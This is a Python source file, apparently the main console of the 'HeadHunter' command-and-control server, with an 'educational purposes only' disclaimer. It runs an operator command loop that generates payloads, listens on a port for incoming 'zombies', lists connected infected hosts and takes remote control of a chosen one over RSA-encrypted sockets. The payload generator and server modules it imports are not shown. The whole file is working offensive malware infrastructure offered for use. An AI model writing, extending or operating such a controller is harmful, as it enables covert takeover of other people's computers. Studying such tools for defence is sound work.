# HeadHunter (C2) server
# Authors: Logan Goins & 0D1NSS0N
# I am not liable for any misuse of this software.
# This software is for educational purposes only

from src import server
from src import generate
import sys 
import rsa
import os

# create the payload output folder if it does not exist
if not os.path.exists('output'):
    os.makedirs('output')

print(
'''
  
 ██░ ██ ▓█████ ▄▄▄      ▓█████▄  ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
▓██░ ██▒▓█   ▀▒████▄    ▒██▀ ██▌▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▒███  ▒██  ▀█▄  ░██   █▌▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░▓█ ░██ ▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓░▒████▒▓█   ▓██▒░▒████▓ ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░ ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░   ░    ░   ▒    ░ ░  ░  ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
 ░  ░  ░   ░  ░     ░  ░   ░     ░  ░  ░   ░              ░             ░  ░   ░     
                         ░                                                           

Command and Control Server (C2)
Author: Logan Goins 
Contributors: 0D1NSS0N

type \'help\' for available commands
''')

while True:
	command = input("HeadHunter/> ").lower().split(" ")
	print(" ")
	if len(command) >= 3:
		cmd = command[0]
		subcmd = command[1]
		arg = command[2]
	elif len(command) >= 2:
		cmd = command[0]
		subcmd = command[1]
	elif len(command) >= 1:
		cmd = command[0]
		params = [cmd]	
	if cmd == "listen":
		server.listen(int(subcmd))
	elif cmd == "generate":
                generate.generate()
	elif cmd == "help":
		print('''
			                       Commands
------------------------------------------------------------------------------------------------------
help                      --          displays this menu
generate		          --          create a payload which is saved in the output folder
listen <LPORT>            --	      starts listening for zombies on the specified local port
show connections	      -- 	      displays active zombie connections by address and source port
control <session>         --          controls an infected zombie by session number
exit                      --          exits the headhunter interactive shell
		''')
	elif cmd == "control":		
		try:
			zombie = server.zombies[int(subcmd)-1].c
			zombiepubkey = server.zombies[int(subcmd)-1].public_partner
			zombie.send(rsa.encrypt(str.encode("\n"), zombiepubkey))
			print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()) + "\n")
			server.control(zombie, zombiepubkey)	
		except OSError:
			print("Zombie is currently disconnected on selected session")
	elif cmd == "show" and subcmd == "connections":		
		try:
			session = 0
			for i in server.zombies:
				if(i != None):
					session+=1
					print("session " + str(session) + " connected on address: " + str(i.c.getpeername()))
			print()			
		except AttributeError:
			print("Server hasn't started yet. Type \"listen <LHOST> <LPORT>\" to start listening for connections\n")		
		except OSError:
			print("No zombies are currently connected\n")
	elif cmd == "exit":
		exit()
	elif cmd.strip(" ") == "":
		continue	
	else:
		print("Invalid command, type \"help\" for a list of commands\n")
